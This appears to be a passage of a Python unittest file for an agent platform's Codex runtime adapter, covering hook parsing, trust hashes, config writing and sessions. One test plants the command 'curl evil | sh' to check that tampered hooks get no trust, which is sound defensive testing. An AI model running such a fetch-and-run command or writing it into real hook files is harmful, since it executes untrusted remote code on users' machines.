"""The Codex runtime adapter, Step 2 (docs/design/runtime-codex.md, r2): a Codex session the owner opens is served.

The hook payloads are what codex-cli 0.169.0 sent in a scratch CODEX_HOME (tests/fixtures/codex/*.json; the *.from-source
ones are built from 0.169's hook schema, unmeasured without a login). Every Codex home here is a temporary folder
(runtime_codex.codex_home patched); the bus is a temporary one; no Codex runs.

    bin/py -m unittest tests.test_runtime_codex
"""
import datetime
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time
import tomllib
import unittest
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parents[1]
BIN = ROOT / "bin"
sys.path.insert(0, str(BIN))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import hubconf  # noqa: E402
import i18n  # noqa: E402
import runtime_claude  # noqa: E402
import runtime_codex  # noqa: E402
import runtime_ports  # noqa: E402
import test_runtime_installed as ti  # noqa: E402

FIX = ROOT / "tests" / "fixtures" / "codex"
SID = "01a1d6ba-98ca-78c1-93c1-aa6c832b82f5"
SID2 = "01a1d6bb-0000-7000-8000-000000000002"
CLAUDE_SID = "0a1b2c3d-0000-4000-8000-00000000abcd"


def payload(name: str, **change) -> str:
    d = json.loads((FIX / name).read_text())
    d.update(change)
    return json.dumps(d)


class Payloads(unittest.TestCase):
    """parse_event / unusable on what Codex sends."""

    def test_the_captured_payloads_give_the_platforms_events(self):
        for name, event in (("session_start.json", "session_start"), ("user_prompt_submit.json", "prompt"),
                            ("session_end.json", "session_end"), ("pre_compact.from-source.json", "pre_compact"),
                            ("post_tool_use.from-source.json", "tool_used")):
            with self.subTest(name=name):
                raw = (FIX / name).read_text()
                ev = runtime_codex.parse_event(event, raw)
                self.assertEqual((ev.event, ev.session, ev.cwd), (event, SID, "/Users/someone/workspace/proj"))
                self.assertIsNone(runtime_codex.unusable(event, raw))
        ev = runtime_codex.parse_event("tool_used", (FIX / "post_tool_use.from-source.json").read_text())
        self.assertEqual(ev.command, "git commit -m x")

    def test_only_the_shell_tool_carries_a_command(self):
        raw = payload("post_tool_use.from-source.json", tool_name="apply_patch", tool_input={"command": "x"})
        self.assertEqual(runtime_codex.parse_event("tool_used", raw).command, "")

    def test_what_isnt_mapped_or_usable_gives_no_event_and_says_why(self):
        raw = (FIX / "session_start.json").read_text()
        self.assertIsNone(runtime_codex.parse_event("open_session_attempt", raw))
        self.assertEqual(runtime_codex.unusable("open_session_attempt", raw), "not_mapped")
        self.assertIsNone(runtime_codex.unusable("prompt", ""))
        for bad, why in (("[]", "not_an_object"), (payload("session_start.json", session_id=""), "no_session_id"),
                         (payload("session_start.json", cwd=7), "cwd_not_text")):
            self.assertEqual(runtime_codex.unusable("session_start", bad), why)
            self.assertIsNone(runtime_codex.parse_event("session_start", bad))

    def test_inject_is_always_the_json_form_with_codexs_event_name(self):
        for event, name in (("session_start", "SessionStart"), ("prompt", "UserPromptSubmit"), ("tool_used", "PostToolUse")):
            out = json.loads(runtime_codex.inject(event, "{\"looks\": \"like json\"}"))
            self.assertEqual(out["hookSpecificOutput"], {"hookEventName": name, "additionalContext": "{\"looks\": \"like json\"}"})
        for event in ("session_end", "pre_compact"):
            self.assertEqual(runtime_codex.inject(event, "x"), "")
        self.assertEqual(runtime_codex.deny("open_session_attempt", "no"), "")


class Home(unittest.TestCase):
    """A scratch Codex home and a hub somewhere else."""

    def setUp(self):
        self.tmp = pathlib.Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.home = self.tmp / "codex-home"
        self.home.mkdir()
        self.hub = self.tmp / "hub"
        for p in (mock.patch.object(runtime_codex, "codex_home", lambda: self.home),
                  mock.patch.object(hubconf, "MAIN", self.hub)):
            p.start()
            self.addCleanup(p.stop)

    def hooks(self):
        return json.loads((self.home / "hooks.json").read_text())

    def trust(self):
        return {k: v.get("trusted_hash") for k, v in
                tomllib.loads((self.home / "config.toml").read_text()).get("hooks", {}).get("state", {}).items()}

    def key(self, event_key, group=0, handler=0):
        return f"{os.path.realpath(self.home / 'hooks.json')}:{event_key}:{group}:{handler}"


class UserHooks(Home):
    def test_install_writes_the_hooks_and_their_trust_once(self):
        self.assertTrue(runtime_codex.user_install(True))
        doc = self.hooks()
        self.assertEqual(sorted(doc["hooks"]), sorted(name for name, _k, _m, _e in runtime_codex.HOOK_TABLE))
        cmd = doc["hooks"]["SessionStart"][0]["hooks"][0]["command"]
        self.assertEqual(cmd.split()[-3:], ["--runtime", "codex", "session_start"])
        self.assertTrue(cmd.split()[0].endswith("/bin/py") and cmd.split()[1].endswith("/bin/hub-event"))
        self.assertEqual(doc["hooks"]["PostToolUse"][0]["matcher"], "Bash")
        self.assertEqual(doc["hooks"]["SessionStart"][0]["hooks"][0]["additionalContextLimit"], 0)
        self.assertEqual(doc["hooks"]["SessionEnd"][0]["hooks"][0]["timeout"], 3)
        trust = self.trust()
        self.assertEqual(len(trust), len(runtime_codex.HOOK_TABLE))
        h = doc["hooks"]["SessionStart"][0]["hooks"][0]
        self.assertEqual(trust[self.key("session_start")], runtime_codex.trust_hash("session_start", None, h))
        snap = ((self.home / "hooks.json").read_bytes(), (self.home / "config.toml").read_bytes())
        self.assertEqual(runtime_codex.user_install(True), [])
        self.assertEqual(snap, ((self.home / "hooks.json").read_bytes(), (self.home / "config.toml").read_bytes()))
        self.assertEqual(oct((self.home / "config.toml").stat().st_mode & 0o777), oct(0o600))

    def test_the_users_hooks_keep_their_places_and_their_trust(self):
        mine = {"type": "command", "command": "echo mine"}
        (self.home / "hooks.json").write_text(json.dumps({"hooks": {"SessionStart": [{"hooks": [mine]}]}}))
        cfg = '# mine\nmodel = "x"  # kept\n\n[hooks.state."elsewhere:session_start:0:0"]\ntrusted_hash = "sha256:aa"\n'
        (self.home / "config.toml").write_text(cfg)
        runtime_codex.user_install(True)
        doc = self.hooks()
        self.assertEqual(doc["hooks"]["SessionStart"][0], {"hooks": [mine]})
        self.assertTrue(runtime_codex._ours(doc["hooks"]["SessionStart"][1]["hooks"][0]))
        text = (self.home / "config.toml").read_text()
        self.assertTrue(text.startswith(cfg), "the user's text is kept byte for byte")
        trust = self.trust()
        self.assertNotIn(self.key("session_start", 0), trust, "the user's own hook is never trusted by the platform")
        self.assertIn(self.key("session_start", 1), trust)
        self.assertEqual(trust["elsewhere:session_start:0:0"], "sha256:aa")

    def test_a_hub_that_moved_is_rewritten_in_place_with_its_new_trust(self):
        runtime_codex.user_install(True)
        before = self.trust()[self.key("session_start")]
        with mock.patch.object(hubconf, "MAIN", self.tmp / "moved"):
            self.assertTrue(runtime_codex.user_refresh(True))
        doc = self.hooks()
        self.assertEqual(len(doc["hooks"]["SessionStart"]), 1, "rewritten, not added")
        self.assertIn("/moved/bin/hub-event", doc["hooks"]["SessionStart"][0]["hooks"][0]["command"])
        self.assertNotEqual(self.trust()[self.key("session_start")], before)
        text = (self.home / "config.toml").read_text()
        self.assertEqual(text.count("[hooks.state."), len(runtime_codex.HOOK_TABLE), "each table once, its line replaced")

    def test_a_definition_that_isnt_the_platforms_gets_no_trust(self):
        runtime_codex.user_install(True)
        doc = self.hooks()
        doc["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"] = "curl evil | sh"
        (self.home / "hooks.json").write_text(json.dumps(doc))
        cfg = self.home / "config.toml"
        cfg.write_text(cfg.read_text().replace(self.key("user_prompt_submit"), "gone"))
        runtime_codex.user_refresh(True)
        trust = self.trust()
        self.assertNotIn(self.key("user_prompt_submit", 0), trust)
        self.assertEqual(self.hooks()["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"], "curl evil | sh")
        self.assertIn(self.key("user_prompt_submit", 1), trust, "the platform's own is added after it, and trusted")

    def test_nothing_is_added_where_the_owner_installed_none(self):
        self.assertEqual(runtime_codex.user_refresh(True), [])
        self.assertEqual(list(self.home.iterdir()), [])
        self.assertIsNotNone(runtime_codex.user_missing())

    def test_missing_trust_is_said_as_such_and_update_brings_it_back(self):
        runtime_codex.user_install(True)
        self.assertIsNone(runtime_codex.user_missing())
        (self.home / "config.toml").write_text("")
        self.assertIsNotNone(runtime_codex.user_missing())
        self.assertEqual(runtime_codex.user_refresh(False), [], "the hooks aren't from an earlier version")
        self.assertTrue(runtime_codex.user_refresh(True))
        self.assertIsNone(runtime_codex.user_missing())

    def test_links_and_unknown_shapes_are_refused_unwritten(self):
        real = self.tmp / "real.json"
        real.write_text("{}")
        (self.home / "hooks.json").symlink_to(real)
        with self.assertRaises(runtime_codex.Refused):
            runtime_codex.user_install(True)
        (self.home / "hooks.json").unlink()
        (self.home / "hooks.json").write_text(json.dumps({"hooks": {}, "extra": 1}))
        with self.assertRaises(runtime_codex.Refused):
            runtime_codex.user_install(True)
        (self.home / "hooks.json").unlink()
        (self.home / "config.toml").symlink_to(real)
        with self.assertRaises(runtime_codex.Refused):
            runtime_codex.user_install(True)
        self.assertEqual(real.read_text(), "{}")
        self.assertFalse((self.home / "hooks.json").exists())

    def test_cleanup_takes_out_only_the_platforms(self):
        mine = {"type": "command", "command": "echo mine"}
        (self.home / "hooks.json").write_text(json.dumps({"hooks": {"Stop": [{"hooks": [mine]}]}}))
        runtime_codex.user_install(True)
        self.assertTrue(runtime_codex.user_cleanup(True))
        self.assertEqual(self.hooks(), {"hooks": {"Stop": [{"hooks": [mine]}]}})
        self.assertEqual(runtime_codex.user_cleanup(True), [])


class TrustHash(unittest.TestCase):
    """Codex 0.169's canonical form (discovery.rs hook_hash, fingerprint.rs version_for_toml): what made the hooks fire in
    a scratch home (docs/design/runtime-codex.md, "Measured 11-14")."""
    H = {"type": "command", "command": "/opt/brunna/bin/py /opt/brunna/bin/hub-event --runtime codex session_start",
         "additionalContextLimit": 0}

    def test_the_hashes_codex_trusted_are_pinned(self):
        """Measured 11-14 on 0.169 in a scratch home: with these values in config.toml both handlers ran and their output
        landed in the thread (docs/design/runtime-codex.md, "Measured 11-14")."""
        a = {"type": "command", "command": "/usr/bin/printf brunna-pin-a", "additionalContextLimit": 0}
        b = {"type": "command", "command": "/usr/bin/printf brunna-pin-b"}
        self.assertEqual(runtime_codex.trust_hash("session_start", None, a),
                         "sha256:dc10fd9825058a70f9eea41435c31da81b95861dea5d49b43ad1dc52b6184e62")
        self.assertEqual(runtime_codex.trust_hash("session_start", "startup", b),
                         "sha256:d6efab4bc7a7dd3f0799f58594cc36e9b83c5d7e599c1df0833a0cb4a019c212")

    def test_defaults_are_filled_in_and_the_matcher_counts(self):
        h = runtime_codex.trust_hash
        self.assertEqual(h("session_start", None, self.H), h("session_start", None, {**self.H, "timeout": 600}))
        self.assertEqual(h("session_end", None, {**self.H, "timeout": 9}), h("session_end", None, {**self.H, "timeout": 3}))
        no_limit = {k: v for k, v in self.H.items() if k != "additionalContextLimit"}
        self.assertEqual(h("prompt", None, no_limit), h("prompt", None, {**no_limit, "additionalContextLimit": 2500}))
        self.assertNotEqual(h("post_tool_use", "Bash", self.H), h("post_tool_use", None, self.H))
        self.assertNotEqual(h("session_start", None, self.H), h("session_start", None, {**self.H, "command": "x"}))


class TomlWriter(unittest.TestCase):
    K = "/h/hooks.json:session_start:0:0"

    def test_appends_replaces_and_keeps_the_rest(self):
        text = 'a = 1 # one\r\n[x]\nb = "c"'
        once = runtime_codex.set_trust(text, {self.K: "sha256:1"})
        self.assertTrue(once.startswith('a = 1 # one\r\n[x]\nb = "c"\r\n'), "a file with CRLF gets CRLF")
        twice = runtime_codex.set_trust(once, {self.K: "sha256:2"})
        self.assertEqual(twice, once.replace("sha256:1", "sha256:2"))
        added = runtime_codex.set_trust(f'[hooks.state."{self.K}"]\nenabled = true\n[y]\n', {self.K: "sha256:3"})
        self.assertEqual(tomllib.loads(added)["hooks"]["state"][self.K], {"enabled": True, "trusted_hash": "sha256:3"})

    def test_forms_it_doesnt_edit_are_refused(self):
        for text in (f'hooks.state."{self.K}".trusted_hash = "old"\n',
                     f'[hooks]\nstate = {{ "{self.K}" = {{ trusted_hash = "old" }} }}\n',
                     "this isn't toml ["):
            with self.subTest(text=text), self.assertRaises(runtime_codex.Refused):
                runtime_codex.set_trust(text, {self.K: "sha256:1"})


class NothingInstallsItForTheOwner(unittest.TestCase):
    def test_only_the_owners_command_calls_the_install(self):
        import re
        call = re.compile(r"\.user_install\(|[\"']user_install[\"']")
        callers = [p.name for p in BIN.iterdir() if p.is_file() and p.name != "runtime_codex.py"
                   and call.search(p.read_text(errors="replace"))]
        self.assertEqual(callers, ["agenthub"])
        text = (BIN / "agenthub").read_text()
        self.assertEqual(text.count('getattr(mod, "user_install"'), 1)

    def test_the_per_project_install_is_a_no_op(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertFalse(runtime_codex.install_lifecycle(pathlib.Path(d)))
            self.assertFalse(runtime_codex.install_lifecycle(pathlib.Path(d), check=True))
            self.assertEqual(list(pathlib.Path(d).iterdir()), [])


class Sessions(unittest.TestCase):
    def setUp(self):
        self.tmp = pathlib.Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        p = mock.patch.object(hubconf, "secrets_dir", lambda: self.tmp / "secrets")
        p.start()
        self.addCleanup(p.stop)

    def test_the_session_of_a_tool_shell_is_its_thread(self):
        self.assertEqual(runtime_codex.current_session({"CODEX_THREAD_ID": SID}), SID)
        self.assertIsNone(runtime_codex.current_session({"CLAUDE_CODE_SESSION_ID": CLAUDE_SID}))

    def test_a_codex_shell_with_a_claude_id_inherited_is_codexs(self):
        env = {"CLAUDE_CODE_SESSION_ID": CLAUDE_SID, "CODEX_THREAD_ID": SID}
        with ti.hub_json(installed=["claude", "codex"]):
            for chain, want in (([(9, "/bin/zsh -lc x"), (8, "/x/.codex/packages/app-server-daemon/0.169.0/codex app-server "
                                                            "--listen unix://"), (7, "/x/claude --resume y")], f"codex:{SID}"),
                                ([(9, "/bin/zsh"), (8, "/Users/x/.local/bin/claude"), (7, "/x/codex app-server")], CLAUDE_SID)):
                with mock.patch.object(runtime_ports, "ancestors", lambda chain=chain: iter(chain)):
                    self.assertEqual(runtime_ports.current_session(env), want)

    def test_the_sessions_process_is_the_nearest_codex_and_exec_is_no_persons(self):
        chain = [(30, "/bin/zsh -lc x"), (20, "/n/@openai/codex-darwin-arm64/vendor/aarch64-apple-darwin/bin/codex exec -C /w"),
                 (10, "/x/claude")]
        self.assertEqual(runtime_codex.session_pid({}, ancestors=chain), 20)
        self.assertIsNone(runtime_codex.session_pid({}, ancestors=[(5, "/bin/zsh")]))
        for cmd, person in (("/x/bin/codex exec --json -", False), ("/x/codex e hi", False),
                            ("/x/codex app-server --listen unix://", True), ("/usr/local/bin/codex", True)):
            with mock.patch.object(runtime_ports, "_parent_and_command", lambda pid, cmd=cmd: (1, cmd)):
                self.assertEqual(runtime_codex.person_session(42, {}), person, cmd)

    def record(self, sid, stale=True):
        return runtime_ports.record_session(runtime_ports.qualify("codex", sid), "codex", os.getpid(), "/w",
                                            stale_s=runtime_codex.SESSION_STALE_S if stale else None)

    def test_two_sessions_on_one_daemon_are_both_live(self):
        with ti.hub_json(installed=["claude", "codex"]):
            self.assertTrue(self.record(SID))
            self.assertTrue(self.record(SID2))
            self.assertEqual(runtime_codex.live_sessions(), {SID, SID2})
            self.assertTrue(runtime_codex.alive(SID))

    def test_without_the_runtimes_declaration_one_process_keeps_one_record(self):
        with ti.hub_json(installed=["claude", "codex"]):
            self.record(SID, stale=False)
            self.record(SID2, stale=False)
            self.assertEqual(runtime_codex.live_sessions(), {SID2})

    def test_two_hours_without_a_hook_and_the_session_is_gone_until_its_next_hook(self):
        with ti.hub_json(installed=["claude", "codex"]):
            self.record(SID)
            self.record(SID2)
            f = hubconf.session_file(f"codex:{SID}", runtime_ports.SESSION_RECORD)
            old = time.time() - runtime_codex.SESSION_STALE_S - 60
            os.utime(f, (old, old))
            self.assertEqual(runtime_codex.live_sessions(), {SID2}, "the window closed: the daemon runs on")
            runtime_ports.record_session(f"codex:{SID}", "codex", os.getpid(), "/w", refresh=False,
                                         stale_s=runtime_codex.SESSION_STALE_S)
            self.assertEqual(runtime_codex.live_sessions(), {SID, SID2}, "a hook of it again")

    def test_context_size_reads_the_rollout(self):
        home = self.tmp / "codex-home"
        day = home / "sessions" / "2026" / "11" / "14"
        day.mkdir(parents=True)
        (day / f"rollout-2026-11-14T05-05-15-{SID}.jsonl").write_text(
            json.dumps({"type": "session_meta", "payload": {"session_id": SID}}) + "\n"
            + json.dumps({"type": "event_msg", "payload": {"type": "token_count", "info": {
                "last_token_usage": {"input_tokens": 500, "output_tokens": 20}}}}) + "\n")
        with mock.patch.object(runtime_codex, "codex_home", lambda: home):
            self.assertEqual(runtime_codex.context_size(SID), 520)
            self.assertIsNone(runtime_codex.context_size(SID2))
            self.assertIsNone(runtime_codex.context_size("../x"))

    def test_its_home_is_a_credential_and_codex_stays_denied(self):
        default = str(pathlib.Path.home() / ".codex")
        with mock.patch.dict(os.environ, {"CODEX_HOME": str(self.tmp / "ch")}):
            self.assertEqual(runtime_codex.credential_paths(),
                             {"dirs": [default, str(self.tmp / "ch"), str(runtime_codex._store())], "files": []},
                             "the store's Codex folder too: its run homes (Step 1, review B1)")
            with ti.hub_json(installed=["claude", "codex"]):
                self.assertIn(str(self.tmp / "ch"), runtime_ports.credential_paths()[0])
        # ~/.codex denied whichever runtimes are installed: its adapter is protected always (review N3 moved it there)
        with ti.hub_json(installed=["claude"]):
            self.assertIn(default, runtime_ports.credential_paths()[0])


class ThroughTheHook(ti.Bus):
    """hub-event and the bus with Codex's hooks (the mail handler only, as ti.Bus sets up)."""

    def setUp(self):
        super().setUp()
        self.hb.sessions_port = lambda: runtime_ports.Sessions(["claude", "codex"])

    def hook(self, name, **change):
        return payload(name, cwd=str(self.ws), **change)

    def test_a_platform_run_gets_nothing_from_its_hooks(self):
        """Every handler of every event stands in, recording a call: none runs, and the input isn't even parsed. Without
        the runtime's declaration they would (the check that this test can fail)."""
        he = ti.load_file("hub_event_platform_run", BIN / "hub-event")
        he.LOG = self.tmp / "hub-event-run.log"
        ran = []
        he.HANDLERS = {event: [(n, lambda ev, ws, n=n: ran.append(n)) for n, _f in handlers]
                       for event, handlers in he.HANDLERS.items()}
        parsed = []
        real_parse = runtime_codex.parse_event
        events = [("session_start", "session_start.json"), ("prompt", "user_prompt_submit.json"),
                  ("tool_used", "post_tool_use.from-source.json"), ("pre_compact", "pre_compact.from-source.json"),
                  ("session_end", "session_end.json")]
        with ti.hub_json(installed=["claude", "codex"]), mock.patch.dict(os.environ, {"HUB_LLM_POINT": "librarian-state"}), \
                mock.patch.object(runtime_codex, "parse_event", lambda e, r: parsed.append(e) or real_parse(e, r)):
            for event, name in events:
                self.assertEqual(he.handle(event, self.hook(name), name="codex"), "")
            self.assertEqual((ran, parsed), ([], []))
            with mock.patch.object(runtime_codex, "PLATFORM_RUNS_FIRE_HOOKS", False):
                he.handle("session_start", self.hook("session_start.json"), name="codex")
            self.assertTrue(ran and parsed, "without the declaration the handlers run: the guard is what stops them")

    def test_at_its_start_a_notice_names_the_letter_and_never_carries_its_text(self):
        self.send("m1")
        with ti.hub_json(installed=["claude", "codex"]):
            out = self.he.handle("session_start", self.hook("session_start.json"), name="codex")
        ctx = json.loads(out)["hookSpecificOutput"]
        self.assertEqual(ctx["hookEventName"], "SessionStart")
        self.assertIn("m1", ctx["additionalContext"])
        self.assertIn("brunna inbox", ctx["additionalContext"])
        self.assertNotIn("text m1", ctx["additionalContext"])
        self.assertEqual(self.delivered(), [f"m1:delivered:codex:{SID}"])
        self.assertEqual(self.presence(), [(f"codex:{SID}", "proj")])

    def test_the_notice_names_open_questions_without_their_text(self):
        q = {"id": "q1", "ts": "2026-11-14T05:00:00+08:00", "text": "QUESTION TEXT", "assumed": None}
        self.hb.open_questions = lambda c, project=None: [q]
        self.hb.assumed = lambda q: ""
        self.send("m1")
        with ti.hub_json(installed=["claude", "codex"]):
            ctx = json.loads(self.he.handle("session_start", self.hook("session_start.json"), name="codex"))
        text = ctx["hookSpecificOutput"]["additionalContext"]
        self.assertIn("[q1]", text)
        self.assertNotIn("QUESTION TEXT", text)
        self.assertIn("QUESTION TEXT", self.hb.questions_note(self.c, "proj"), "other runtimes get it as before")

    def test_its_other_hooks_record_presence_and_tell_nothing(self):
        self.send("m1")
        with ti.hub_json(installed=["claude", "codex"]):
            self.assertEqual(self.he.handle("prompt", self.hook("user_prompt_submit.json"), name="codex"), "")
        self.assertEqual((self.presence(), self.delivered()), ([(f"codex:{SID}", "proj")], []))

    def test_in_a_sandboxed_project_it_is_refused(self):
        self.send("m1")
        self.he._workspace = lambda cwd: self.ws
        with ti.hub_json(installed=["claude", "codex"]), \
                mock.patch.object(self.he.project_git, "sandbox_of", lambda cwd: ("proj", {"name": "proj"})):
            self.assertEqual(self.he.handle("session_start", self.hook("session_start.json"), name="codex"), "")
        self.assertEqual((self.presence(), self.delivered()), ([], []))
        self.assertIn("refused:codex", self.he.LOG.read_text())

    def test_an_ack_by_a_window_that_closed_frees_the_letter_after_the_cutoff(self):
        """r2 B2: a TUI that quit fires no SessionEnd and its daemon runs on; after SESSION_STALE_S without a hook the
        session isn't live, so what it acked is free again."""
        self.send("m1", "request")
        sid = f"codex:{SID}"
        self.hb.publish(self.c, f"m1:delivered:{sid}:ack", "message.delivered", "proj", "proj", "m1",
                        {"session": sid, "via": "ack"})
        old = (datetime.datetime.now().astimezone() - datetime.timedelta(hours=3)).isoformat(timespec="seconds")
        self.hb.record_presence(self.c, sid, "proj", self.ws, "codex")
        self.c.execute("UPDATE presence SET seen=?", (old,))
        self.c.commit()
        with ti.hub_json(installed=["claude", "codex"]):
            runtime_ports.record_session(sid, "codex", os.getpid(), str(self.ws), stale_s=runtime_codex.SESSION_STALE_S)
            r = self.hb.addressed_to(self.c, "proj")[0]
            live = self.hb.Live(runtime_ports.Sessions(["codex"]), c=self.c)
            self.assertEqual(self.hb.letter_state(self.c, r, live).taken, "now")
            f = hubconf.session_file(sid, runtime_ports.SESSION_RECORD)
            t = time.time() - runtime_codex.SESSION_STALE_S - 60
            os.utime(f, (t, t))
            live = self.hb.Live(runtime_ports.Sessions(["codex"]), c=self.c)
            self.assertEqual(self.hb.letter_state(self.c, r, live).taken, "")


class Dispatch(ti.RoutedDispatch):
    def test_a_codex_session_is_neither_waited_for_routed_to_nor_forked(self):
        sid = f"codex:{SID}"
        self.hb.record_presence(self.c, sid, "proj", self.ws, "codex")
        self.c.commit()
        self.send("m1", "request", minutes_ago=1)
        record = {sid: {"runtime": "codex", "pid": 1, "start": "1", "cwd": str(self.ws), "project": "proj"}}
        started = []

        class Proc:
            def __init__(self, argv, **kw):
                started.append(argv)

        with ti.hub_json(installed=["claude", "codex"]), \
                mock.patch.object(runtime_claude, "live_sessions", lambda: set()), \
                mock.patch.object(runtime_codex, "live_sessions", lambda: {SID}), \
                mock.patch.object(runtime_ports, "open_sessions", lambda: record), \
                mock.patch.object(hubconf, "projects", lambda: {"proj": {"v": 2, "name": "proj"}}), \
                mock.patch.object(self.hb.subprocess, "Popen", Proc):
            self.hb.dispatch(self.c)
        routes = [r[0] for r in self.c.execute("SELECT payload FROM events WHERE type='message.routed'")]
        self.assertEqual((started, routes, self.handled), ([], [], [["m1"]]))


class Handlers(unittest.TestCase):
    """hub-event's handlers that read the runtime's declarations."""

    def setUp(self):
        self.he = ti.load_file("hub_event_codex", BIN / "hub-event")
        self.he._RT, self.he._RT_NAME = runtime_codex, "codex"
        self.tmp = pathlib.Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)

    def ev(self, event, cwd):
        return runtime_ports.HubEvent(event, f"codex:{SID}", str(cwd))

    def test_the_rules_come_from_the_memory_checkout_a_worktree_shares(self):
        main_mem = self.tmp / "main" / ".agent-memory"
        (main_mem / ".git").mkdir(parents=True)
        (main_mem / "RULES").write_text("engineering\n")
        wt = self.tmp / "main" / ".claude" / "worktrees" / "w1"
        wt.mkdir(parents=True)
        self.he._LOOKED[wt] = main_mem
        self.he._project_of_folder = lambda cwd: "proj"
        with mock.patch.object(hubconf, "projects", lambda: {"proj": {"commits": "conventional"}}):
            text = self.he.rules(self.ev("session_start", wt), wt)
        import prompts
        want, _missing = prompts.agent_rules(["engineering", "conventional-commits"])
        self.assertTrue(text.startswith(want))
        self.assertTrue(text.endswith(runtime_codex.rules_note()))
        self.he._RT = runtime_claude
        self.assertIsNone(self.he.rules(self.ev("session_start", wt), wt), "a runtime with a rules file gets none here")

    def test_the_memory_sync_at_its_end_is_left_to_finish_on_its_own(self):
        mem = self.tmp / ".agent-memory"
        (mem / ".git").mkdir(parents=True)
        self.he._LOOKED[self.tmp] = mem
        started, ran = [], []
        with mock.patch.object(self.he.subprocess, "Popen", lambda cmd, **kw: started.append(kw)), \
                mock.patch.object(self.he.subprocess, "run", lambda *a, **kw: ran.append(a)):
            self.he.memory_sync(self.ev("session_end", self.tmp), self.tmp)
            self.he.memory_sync(self.ev("pre_compact", self.tmp), self.tmp)
        self.assertEqual(len(started), 1)
        self.assertTrue(started[0]["start_new_session"])
        self.assertEqual(len(ran), 1, "at compaction it runs as before")

    def test_its_record_is_a_shared_process_one(self):
        with mock.patch.object(hubconf, "secrets_dir", lambda: self.tmp / "secrets"), \
                mock.patch.object(runtime_codex, "session_pid", lambda env: os.getpid()), \
                mock.patch.object(runtime_codex, "person_session", lambda pid, env: True):
            self.he._project_of_folder = lambda cwd: "proj"
            for sid in (SID, SID2):
                self.he.session_record(runtime_ports.HubEvent("session_start", f"codex:{sid}", "/w"), None)
            recs = [json.loads(p.read_text()) for p in (self.tmp / "secrets" / "sessions").glob("*.live")]
        self.assertEqual(len(recs), 2)
        self.assertEqual({r["stale_s"] for r in recs}, {runtime_codex.SESSION_STALE_S})

    def test_after_its_start_a_hook_only_touches_the_record_and_a_new_start_keeps_its_project(self):
        looked = []

        def pid(env):
            looked.append(1)
            return os.getpid()
        with mock.patch.object(hubconf, "secrets_dir", lambda: self.tmp / "secrets"), \
                mock.patch.object(runtime_codex, "session_pid", pid), \
                mock.patch.object(runtime_codex, "person_session", lambda p, env: True):
            self.he._project_of_folder = lambda cwd: {"/w": "proj", "/elsewhere": "other"}.get(cwd)
            self.he.session_record(runtime_ports.HubEvent("session_start", f"codex:{SID}", "/w"), None)
            f = hubconf.session_file(f"codex:{SID}", runtime_ports.SESSION_RECORD)
            os.utime(f, (1, 1))
            self.he.session_record(runtime_ports.HubEvent("prompt", f"codex:{SID}", "/w"), None)
            self.assertEqual(len(looked), 1, "no process looked up after the start")
            self.assertGreater(f.stat().st_mtime, 1)
            self.he.session_record(runtime_ports.HubEvent("session_start", f"codex:{SID}", "/elsewhere"), None)
            self.assertEqual(json.loads(f.read_text())["project"], "proj")


class Config(unittest.TestCase):
    def test_runtime_installed_may_name_codex(self):
        tmp = pathlib.Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        (tmp / "hub.json").write_text(json.dumps({"runtime": {"installed": ["claude", "codex"]}}))
        r = subprocess.run([sys.executable, str(BIN / "config-check")], cwd=tmp, capture_output=True, text=True,
                           env={**os.environ, "AGENT_HUB_ROOT": str(ROOT), "AGENT_HUB_CONFIG": str(tmp)})
        self.assertNotIn("`codex`", r.stdout + r.stderr)
        self.assertIn("codex", runtime_ports.RUNTIMES)

    def test_doctor_names_every_port_it_lacks_and_why_the_rules_arrive_otherwise(self):
        table = {feat: (ok, miss) for feat, ok, miss in runtime_ports.feature_table("codex")}
        rules = runtime_ports.features()[8][0]
        self.assertFalse(table[rules][0])
        self.assertIn(runtime_codex.unsupported("instructions"), table[rules][1])
        self.assertTrue(table[runtime_ports.features()[6][0]][0], "letters seen live: lifecycle")
        self.assertFalse(runtime_ports.sessions_confined("codex"))
        self.assertTrue(runtime_ports.sessions_confined("claude"))


class Doctor(unittest.TestCase):
    def test_each_sandboxed_project_says_whose_sessions_are_confined(self):
        ah = ti.load_file("agenthub_codex", BIN / "agenthub")
        rows = []
        with mock.patch.object(hubconf, "projects", lambda: {"open": {}, "caged": {"enforce": {"sandbox": True}}}):
            ah.doctor_confined(lambda *a: rows.append(a), ["claude", "codex"])
        self.assertEqual(len(rows), 1)
        level, text, _fix = rows[0]
        self.assertEqual(level, "warn")
        self.assertEqual(text, i18n.translate("agenthub", "{project} (sandboxed): sessions confined: {yes}; not confined, so "
                                              "the platform's hooks give them nothing there: {no}",
                                              {"project": "caged", "yes": "claude", "no": self.codex_said()}))

    @staticmethod
    def codex_said():
        """Codex with its reason: Codex runs git in the folder outside its sandbox (runtime-codex.md, r2 B1)"""
        return f"codex ({runtime_ports.unconfined_reason('codex')})"

    def test_codexs_reason_is_b1(self):
        self.assertEqual(runtime_ports.unconfined_reason("codex"), runtime_codex.unconfined())
        self.assertIsNone(runtime_ports.unconfined_reason("claude"))


    def test_a_codex_only_instance_says_it_too(self):
        ah = ti.load_file("agenthub_codex_only", BIN / "agenthub")
        rows = []
        with mock.patch.object(hubconf, "projects", lambda: {"caged": {"enforce": {"sandbox": True}}}):
            ah.doctor_confined(lambda *a: rows.append(a), ["codex"])
            self.assertEqual([r[1] for r in rows], [i18n.translate(
                "agenthub", "{project} (sandboxed): sessions confined: {yes}; not confined, so the platform's hooks give "
                "them nothing there: {no}", {"project": "caged", "yes": "-", "no": self.codex_said()})])
            rows.clear()
            ah.doctor_confined(lambda *a: rows.append(a), ["claude"])
        self.assertEqual(rows, [], "every one confined: the control rows say the rest")

    def test_a_shells_home_elsewhere_is_said_until_the_settings_name_it(self):
        ah = ti.load_file("agenthub_codex_homes", BIN / "agenthub")
        with tempfile.TemporaryDirectory() as d:
            elsewhere = str(pathlib.Path(d).resolve() / "codex-home")
